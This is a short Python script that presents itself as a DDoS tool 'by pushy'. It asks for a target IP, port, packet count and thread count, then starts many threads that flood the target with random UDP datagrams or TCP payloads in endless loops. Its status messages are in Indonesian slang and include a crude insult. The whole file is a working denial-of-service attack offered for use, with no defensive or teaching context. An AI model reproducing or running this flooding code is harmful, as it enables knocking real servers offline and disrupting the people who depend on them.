#!/usr/bin/env python3
#Ddos by pushy
#Join My T3Am :
import random
import socket
import threading
import os

os.system("clear")
print("--> Autor : pushy : pushy <--")
print("-->        Dd0s By pushy <--")
print("#--        pushy NIH BOSS --#")
ip = str(input(" DdosAttackBypushy Ip:"))
port = int(input(" DdosAttackBypushy Port:"))
choice = str(input(" DdosAttackBypushy Gas Gak Ni?(y/n):"))
times = int(input(" DdosAttackByPushy Packets:"))
threads = int(input(" DdosAttackByPushy Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Pushy nih bos!!!")
		except:
			print("[!] Server down kontol!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Pushy nih bos!!!")
		except:
			s.close()
			print("[*] Down lagi kontol")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
